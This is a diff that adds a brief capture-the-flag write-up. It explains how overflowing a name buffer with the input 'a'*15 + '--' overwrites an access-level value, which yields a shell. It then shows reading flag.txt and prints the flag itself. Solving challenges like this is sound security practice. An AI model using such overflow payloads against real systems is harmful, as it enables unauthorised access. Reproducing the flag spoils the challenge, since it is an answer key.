@@ -1,0 +1,10 @@
+1. Kinda confusing, you were able to brute-force your way to the solution.
+2. You need access level < 0x30.
+3. If you overflow the name buffer, you write into the access level. By injecting the string:
+	aaaaaaaaaaaaaaa--
+	or
+	'a' * 15 + '-' * 2
+4. This results in access level 0x0000002d, giving you shell. Then:
+	cat flag.txt
+gives you flag:
+da1e62f3da550878ed92d3d55d61fe7d
